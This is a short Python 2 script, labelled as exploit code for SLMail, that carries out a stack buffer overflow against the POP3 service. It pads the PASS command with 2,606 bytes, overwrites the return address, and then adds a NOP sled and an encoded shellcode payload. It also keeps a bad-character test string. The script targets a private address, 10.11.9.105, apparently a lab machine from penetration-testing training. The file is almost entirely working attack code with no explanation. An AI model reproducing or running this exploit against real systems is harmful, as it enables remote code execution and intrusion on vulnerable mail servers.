#!/usr/bin/python
import socket

#exploit code for slmail

badchar = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = ("\xda\xc3\xd9\x74\x24\xf4\x58\xbb\x77\x97\xaa\x89\x33\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x58\x13\x03\x2f\x84\x48\x7c\x33\x42\x0e"
"\x7f\xcb\x93\x6f\x09\x2e\xa2\xaf\x6d\x3b\x95\x1f\xe5\x69\x1a"
"\xeb\xab\x99\xa9\x99\x63\xae\x1a\x17\x52\x81\x9b\x04\xa6\x80"
"\x1f\x57\xfb\x62\x21\x98\x0e\x63\x66\xc5\xe3\x31\x3f\x81\x56"
"\xa5\x34\xdf\x6a\x4e\x06\xf1\xea\xb3\xdf\xf0\xdb\x62\x6b\xab"
"\xfb\x85\xb8\xc7\xb5\x9d\xdd\xe2\x0c\x16\x15\x98\x8e\xfe\x67"
"\x61\x3c\x3f\x48\x90\x3c\x78\x6f\x4b\x4b\x70\x93\xf6\x4c\x47"
"\xe9\x2c\xd8\x53\x49\xa6\x7a\xbf\x6b\x6b\x1c\x34\x67\xc0\x6a"
"\x12\x64\xd7\xbf\x29\x90\x5c\x3e\xfd\x10\x26\x65\xd9\x79\xfc"
"\x04\x78\x24\x53\x38\x9a\x87\x0c\x9c\xd1\x2a\x58\xad\xb8\x22"
"\xad\x9c\x42\xb3\xb9\x97\x31\x81\x66\x0c\xdd\xa9\xef\x8a\x1a"
"\xcd\xc5\x6b\xb4\x30\xe6\x8b\x9d\xf6\xb2\xdb\xb5\xdf\xba\xb7"
"\x45\xdf\x6e\x17\x15\x4f\xc1\xd8\xc5\x2f\xb1\xb0\x0f\xa0\xee"
"\xa1\x30\x6a\x87\x48\xcb\xfd\xa2\x87\xd3\x84\xda\x95\xd3\x77"
"\xa0\x13\x35\x1d\xc6\x75\xee\x8a\x7f\xdc\x64\x2a\x7f\xca\x01"
"\x6c\x0b\xf9\xf6\x23\xfc\x74\xe4\xd4\x0c\xc3\x56\x72\x12\xf9"
"\xfe\x18\x81\x66\xfe\x57\xba\x30\xa9\x30\x0c\x49\x3f\xad\x37"
"\xe3\x5d\x2c\xa1\xcc\xe5\xeb\x12\xd2\xe4\x7e\x2e\xf0\xf6\x46"
"\xaf\xbc\xa2\x16\xe6\x6a\x1c\xd1\x50\xdd\xf6\x8b\x0f\xb7\x9e"
"\x4a\x7c\x08\xd8\x52\xa9\xfe\x04\xe2\x04\x47\x3b\xcb\xc0\x4f"
"\x44\x31\x71\xaf\x9f\xf1\x91\x52\x35\x0c\x3a\xcb\xdc\xad\x27"
"\xec\x0b\xf1\x51\x6f\xb9\x8a\xa5\x6f\xc8\x8f\xe2\x37\x21\xe2"
"\x7b\xd2\x45\x51\x7b\xf7")

#buffer = "A" * 2606 + "B" * 4 + badchar
buffer = "A" * 2606 + "\xe3\x41\x4b\x5f" + "\x90" * 16 + shellcode + "C" * (3500-2606-4-351-16) 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  print "\n Sending evil buffer..."
  s.connect(('10.11.9.105',110))
  data = s.recv(1024)
  s.send('USER test\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\n Done"
except:
  print "Could not connect to POP3!"

